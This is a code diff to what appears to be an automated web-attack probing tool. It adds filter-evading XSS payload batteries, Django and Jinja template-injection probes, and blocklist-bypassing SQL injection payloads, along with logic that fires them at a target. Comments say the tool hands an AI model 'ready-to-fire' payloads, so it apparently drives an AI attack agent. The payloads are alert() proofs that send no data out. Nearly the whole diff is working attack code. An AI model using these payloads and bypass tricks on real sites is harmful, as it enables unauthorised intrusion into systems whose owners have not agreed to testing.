@@ -66,6 +66,17 @@ const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
   (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<input autofocus onfocus=alert(${n})>`, sig: new RegExp(`onfocus=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<a href=javascript:alert(${n})>x</a>`, sig: new RegExp(`href=javascript:alert\\(${n}`, "i") }),
+  // 1b) slash-separated (space-free) handlers — beat a filter that blocks SPACE + onerror (only the
+  //     <image/src/onerror> form was space-free before; apply the slash trick to every handler).
+  (n) => ({ payload: `<svg/onload=alert(${n})>`, sig: new RegExp(`<svg/onload=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<img/src/onerror=alert(${n})>`, sig: new RegExp(`<img/src/onerror=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<body/onpageshow=alert(${n})>`, sig: new RegExp(`<body/onpageshow=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<details/open/ontoggle=alert(${n})>`, sig: new RegExp(`<details/open/ontoggle=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<marquee/onstart=alert(${n})>`, sig: new RegExp(`<marquee/onstart=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<input/autofocus/onfocus=alert(${n})>`, sig: new RegExp(`<input/autofocus/onfocus=alert\\(${n}`, "i") }),
+  // 1c) <style> onload weaponization (space + slash) — for a tag-allowlist that permits only <style>.
+  (n) => ({ payload: `<style onload=alert(${n})>`, sig: new RegExp(`<style onload=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<style/onload=alert(${n})>`, sig: new RegExp(`<style/onload=alert\\(${n}`, "i") }),
   // 2) alert-obfuscation bypasses (still call alert — beat literal-"alert" blocklists)
   (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape
   (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat
@@ -74,11 +85,40 @@ const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
   //     a new tag (many filters strip `<` but pass `"`+`on…`). Needs interaction, so ranked mid-list.
   (n) => ({ payload: `" onmouseover=alert(${n}) x="`, sig: new RegExp(`" onmouseover=alert\\(${n}`, "i") }), // double-quoted attr
   (n) => ({ payload: `' onmouseover=alert(${n}) x='`, sig: new RegExp(`' onmouseover=alert\\(${n}`, "i") }), // single-quoted attr
+  // 2c) bare javascript: URI value — reflection INSIDE href/src="…" when <>" are stripped (no tag/attr
+  //     breakout possible); the whole value becomes the script URI.
+  (n) => ({ payload: `javascript:alert(${n})`, sig: new RegExp(`javascript:alert\\(${n}`, "i") }),
+  // 2d) HTML-entity-encoded parens — event handler when ( ) and backtick are blocked (the parser
+  //     decodes &#40; &#41; to ( ) before JS eval).
+  (n) => ({ payload: `" onerror=alert&#40;${n}&#41; x="`, sig: new RegExp(`" onerror=alert&#40;${n}`, "i") }),
+  (n) => ({ payload: `' onerror=alert&#40;${n}&#41; x='`, sig: new RegExp(`' onerror=alert&#40;${n}`, "i") }),
   // 3) non-alert JS-exec proofs LAST (won't satisfy an alert-checker — fallback evidence only)
   (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
   (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }),
   (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
   (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
+]
+
+// NON-quote-delimited alert-argument battery. The XSS_WEAPONS above always deliver the marker as
+// "XSS" / 'XSS' — a filter that strips ["']XSS["'] deletes the argument and leaves alert(). These
+// build the "XSS" string WITHOUT surrounding quotes (backtick / regex-source), so a quote-XSS strip
+// can't touch them. EMIT DIFFERS: the nonce is replaced with a BARE `XSS` (no quotes) — the delimiter
+// is already part of the payload. Detection uses the nonce inside the same delimiter.
+const XSS_WEAPONS_BAREARG: ((n: string) => { payload: string; sig: RegExp })[] = [
+  (n) => ({ payload: `<svg onload=alert(\`${n}\`)>`, sig: new RegExp(`onload=alert\\(\`${n}\``, "i") }), // backtick, tag context
+  (n) => ({ payload: `<svg/onload=alert(\`${n}\`)>`, sig: new RegExp(`<svg/onload=alert\\(\`${n}\``, "i") }), // slash + backtick
+  (n) => ({ payload: `<svg onload=alert(/${n}/.source)>`, sig: new RegExp(`alert\\(/${n}/\\.source\\)`, "i") }), // regex-source
+  (n) => ({ payload: `" onfocus=alert(\`${n}\`) autofocus x="`, sig: new RegExp(`" onfocus=alert\\(\`${n}\``, "i") }), // dbl-quote attr stay-in, backtick
+  (n) => ({ payload: `' onfocus=alert(\`${n}\`) autofocus x='`, sig: new RegExp(`' onfocus=alert\\(\`${n}\``, "i") }), // single-quote attr stay-in
+]
+
+// ENCODED-marker battery — a `<script>`-string breakout that bans UPPERCASE + quotes ('XSS' can't be
+// written). The marker is built from percent-escapes (`%58%53%53` = "XSS") decoded at runtime — no
+// uppercase, no quotes. Detection uses a nonce inside the same shape; EMIT is a FIXED ready form
+// (the nonce can't carry the encoding). `probe` finds survival, `ready` is what the model fires.
+const XSS_WEAPONS_ENCODED: { probe: (n: string) => { payload: string; sig: RegExp }; ready: string }[] = [
+  { probe: (n) => ({ payload: `alert(unescape(\`${n}\`))`, sig: new RegExp(`alert\\(unescape\\(\`${n}\``, "i") }), ready: "alert(unescape(`%58%53%53`))" },
+  { probe: (n) => ({ payload: `";alert(unescape(\`${n}\`))//`, sig: new RegExp(`";alert\\(unescape\\(\`${n}\``, "i") }), ready: '";alert(unescape(`%58%53%53`))//' }, // JS-string breakout
 ]
 
 const XSS_NOT_TESTED = [
@@ -109,6 +149,16 @@ const SSTI_SYNTAXES: { name: string; wrap: (e: string) => string }[] = [
   { name: "*{ }", wrap: (e) => `*{${e}}` }, // Thymeleaf selection expr
   { name: "[[${ }]]", wrap: (e) => `[[\${${e}}]]` }, // Thymeleaf inline eval (bypasses ${ } filters)
   { name: "{{= }}", wrap: (e) => `{{=${e}}}` }, // Underscore / doT / EJS-alt
+]
+// Alt SSTI battery — engines the `{{expr*expr}}` arithmetic loop can't reach:
+//   • Django DTL has NO `*` arithmetic → use the `add` filter (numeric addition) with a distinctive sum.
+//   • statement-tag (`{% set %}`) — for engines/filters that block the `{{ }}` output form.
+// Same evidence shape as the main loop: distinctive PRODUCT present AND literal expression absent.
+const SSTI_ADD_A = 7919191
+const SSTI_ADD_SUM = String(SSTI_ADD_A + SSTI_B) // 7926032 — distinctive, ~zero coincidence
+const SSTI_ALT: { name: string; payload: string; product: string; literal: string }[] = [
+  { name: "django {{|add:}}", payload: `{{ ${SSTI_ADD_A}|add:${SSTI_B} }}`, product: SSTI_ADD_SUM, literal: `${SSTI_ADD_A}|add:${SSTI_B}` }, // Django DTL
+  { name: "jinja {% set %}", payload: `{% set _p=${SSTI_EXPR} %}{{_p}}`, product: SSTI_PRODUCT, literal: SSTI_EXPR }, // statement-tag
 ]
 const SSTI_NOT_TESTED = [
   "blind/out-of-band SSTI (evaluated result not reflected in the response)",
@@ -191,6 +241,15 @@ const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
       { t: "') OR ('1'='1", f: "') OR ('1'='2" },
       { t: "' OR 1=1-- -", f: "' OR 1=2-- -" },
       { t: "1 OR 1=1", f: "1 OR 1=2" },
+      // mixed-case OR (case-bypass previously existed for AND only) — beats a case-exact OR blocklist
+      { t: "' oR '1'='1", f: "' oR '1'='2" },
+      { t: "' Or '1'='1-- -", f: "' Or '1'='2-- -" },
+      // spaceless OR — beats a whitespace-stripping filter (no spaces, `#` comment, or /**/ )
+      { t: '"or(1)#', f: '"or(0)#' },
+      { t: "'or(1)#", f: "'or(0)#" },
+      { t: "'/**/OR/**/'1'='1", f: "'/**/OR/**/'1'='2" },
+      // single-row-anchored oracle (LIMIT 1) — for a `num_rows==1` differential where OR-all collapses
+      { t: "' OR 1=1 LIMIT 1-- -", f: "' OR 1=1 LIMIT 1 OFFSET 9-- -" },
     ],
     signatures:
       /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?|XPATH syntax error|invalid input syntax for|Conversion failed when converting|Unknown column '\d/i,
@@ -770,18 +829,34 @@ function classifyXssContext(text: string, marker: string): string {
   if (/<textarea\b[^>]*>(?:(?!<\/textarea>)[\s\S])*$/i.test(before)) return "rcdata-textarea"
   if (/<title\b[^>]*>(?:(?!<\/title>)[\s\S])*$/i.test(before)) return "rcdata-title"
   if (/<style\b[^>]*>(?:(?!<\/style>)[\s\S])*$/i.test(before)) return "rcdata-style"
-  if (/=\s*"[^"]*$/.test(before)) return "attribute-double-quote"
-  if (/=\s*'[^']*$/.test(before)) return "attribute-single-quote"
+  // url-bearing attributes (href/src/…) — a bare `javascript:` value executes HERE (and only here)
+  const urlAttr = /(?:href|src|action|formaction|xlink:href|poster|data)\s*=\s*/i
+  if (/=\s*"[^"]*$/.test(before)) return urlAttr.test(before) ? "attribute-url-double" : "attribute-double-quote"
+  if (/=\s*'[^']*$/.test(before)) return urlAttr.test(before) ? "attribute-url-single" : "attribute-single-quote"
   if (/<[a-z][^>]*$/i.test(before)) return "tag-name"
   return "html-body"
 }
 const XSS_BREAKOUT: Record<string, (n: string) => string> = {
   "attribute-double-quote": (n) => `"><svg data-p=${n}>`,
   "attribute-single-quote": (n) => `'><svg data-p=${n}>`,
+  "attribute-url-double": (n) => `"><svg data-p=${n}>`, // url attr: tag-breakout still applies here too
+  "attribute-url-single": (n) => `'><svg data-p=${n}>`,
   javascript: (n) => `</script><svg data-p=${n}>`,
   "rcdata-textarea": (n) => `</textarea><svg data-p=${n}>`,
   "rcdata-title": (n) => `</title><svg data-p=${n}>`,
   "rcdata-style": (n) => `</style><svg data-p=${n}>`,
+}
+// Route a weapon to the context where it actually EXECUTES, so firing the battery in an attribute/JS
+// context never emits a FALSE lead (a handler substring can reflect raw even when the tag/quote that
+// would make it run is encoded). tag-based (`<…>`) needs a raw surviving tag; a bare `javascript:`
+// value runs ONLY in a url attribute; a quote-breakout (`"…`/`'…`) fits an attribute stay-in or a
+// JS-string; a bare alert(…) needs a JS context.
+function xssWeaponFires(payload: string, survived: boolean, ctx: string): boolean {
+  const s = payload.replace(/^\s+/, "")
+  if (s.startsWith("javascript:")) return /attribute-url/.test(ctx)
+  if (s.startsWith("<")) return survived
+  if (/^["']/.test(s)) return /attribute|javascript/.test(ctx)
+  return /javascript/.test(ctx) || survived
 }
 
 interface PointObservation {
@@ -847,7 +922,10 @@ async function probeXssPoint(
       continue
     }
     // FACT: does `<tag ... tn` appear raw (tag survived), vs `&lt;tag` (encoded), vs tn alone (stripped)?
-    const rawTag = new RegExp(`<${tag}\\b[^>]*${tn}`, "i").test(res.text)
+    // Match the EXACT injected form `<tag/data-p=NONCE` — a loose `<tag\b[^>]*NONCE` also matches the
+    // OUTER real tag when our marker reflects inside ITS attribute value (e.g. `<input value="…NONCE…">`
+    // for tag=input), a false "survival" that then fires the whole weaponize battery in a SAFE context.
+    const rawTag = new RegExp(`<${tag}/data-p=${tn}`, "i").test(res.text)
     const encoded = res.text.includes(`&lt;${tag}`) || res.text.includes(`&lt;${tag.toUpperCase()}`)
     if (rawTag) obs.surviving_tags.push(tag)
     if (obs.marker_html_encoded === null) obs.marker_html_encoded = encoded && !rawTag
@@ -861,14 +939,19 @@ async function probeXssPoint(
     const res = await send(r, applyPayload(r, point, mk(tn)), abort, budget)
     if (!("error" in res) && !looksBlocked(res.status) && new RegExp(`<svg\\b[^>]*${tn}`, "i").test(res.text)) obs.breakout = mk(tn)
   }
-  // 4) weaponized + filter-bypass battery — only if a tag already survived (weaponization plausible).
-  //    Reports which FULL handler payload (incl. alert/confirm-blocklist bypasses) reflects RAW, so a
-  //    weak model gets a ready-to-fire payload instead of guessing the evasion itself.
-  if (obs.surviving_tags.length > 0) {
+  // 4) weaponized + filter-bypass battery — fire when a tag survived OR the marker sits in an
+  //    attribute/JS/RCDATA context. Each weapon is ROUTED (xssWeaponFires) to the context where it
+  //    actually executes, so a handler substring reflecting raw in a SAFE (encoded) context never
+  //    emits a false lead. Reports the FULL ready payload.
+  const survived = obs.surviving_tags.length > 0
+  const ctx = obs.context ?? ""
+  const attrCtx = /attribute|javascript|rcdata/.test(ctx)
+  if (survived || attrCtx) {
     for (const make of XSS_WEAPONS) {
       if (abort.aborted || budget.sent >= budget.max) break
       const wn = nonce()
       const { payload, sig } = make(wn)
+      if (!xssWeaponFires(payload, survived, ctx)) continue
       const res = await send(r, applyPayload(r, point, payload), abort, budget)
       if ("error" in res || looksBlocked(res.status)) continue
       if (sig.test(res.text)) {
@@ -878,6 +961,28 @@ async function probeXssPoint(
         obs.weaponized.push(payload.replace(wn, '"XSS"'))
         obs.weaponized.push(payload.replace(wn, "'XSS'"))
       }
+      await sleep(delayMs)
+    }
+    // 4b) non-quote-delimited arg battery — emit with a BARE `XSS` (delimiter is in the payload).
+    for (const make of XSS_WEAPONS_BAREARG) {
+      if (abort.aborted || budget.sent >= budget.max) break
+      const wn = nonce()
+      const { payload, sig } = make(wn)
+      if (!xssWeaponFires(payload, survived, ctx)) continue
+      const res = await send(r, applyPayload(r, point, payload), abort, budget)
+      if ("error" in res || looksBlocked(res.status)) continue
+      if (sig.test(res.text)) obs.weaponized.push(payload.replace(wn, "XSS")) // bare marker, no quotes
+      await sleep(delayMs)
+    }
+    // 4c) encoded-marker battery — nonce probes survival, a FIXED percent-escaped form is emitted.
+    for (const w of XSS_WEAPONS_ENCODED) {
+      if (abort.aborted || budget.sent >= budget.max) break
+      const wn = nonce()
+      const { payload, sig } = w.probe(wn)
+      if (!xssWeaponFires(payload, survived, ctx)) continue
+      const res = await send(r, applyPayload(r, point, payload), abort, budget)
+      if ("error" in res || looksBlocked(res.status)) continue
+      if (sig.test(res.text)) obs.weaponized.push(w.ready)
       await sleep(delayMs)
     }
   }
@@ -939,6 +1044,19 @@ async function probeSstiPoint(
     }
     if (res.text.includes(SSTI_PRODUCT) && !res.text.includes(SSTI_EXPR))
       obs.evaluated.push({ syntax: s.name, snippet: excerptOf(res.text, SSTI_PRODUCT) })
+    await sleep(delayMs)
+  }
+  // Alt battery (Django add-filter, statement-tag) — each carries its OWN product + literal.
+  for (const a of SSTI_ALT) {
+    if (abort.aborted || budget.sent >= budget.max) break
+    const res = await send(r, applyPayload(r, point, a.payload), abort, budget)
+    if ("error" in res) continue
+    if (looksBlocked(res.status)) {
+      obs.blocked = true
+      continue
+    }
+    if (res.text.includes(a.product) && !res.text.includes(a.literal))
+      obs.evaluated.push({ syntax: a.name, snippet: excerptOf(res.text, a.product) })
     await sleep(delayMs)
   }
   return obs
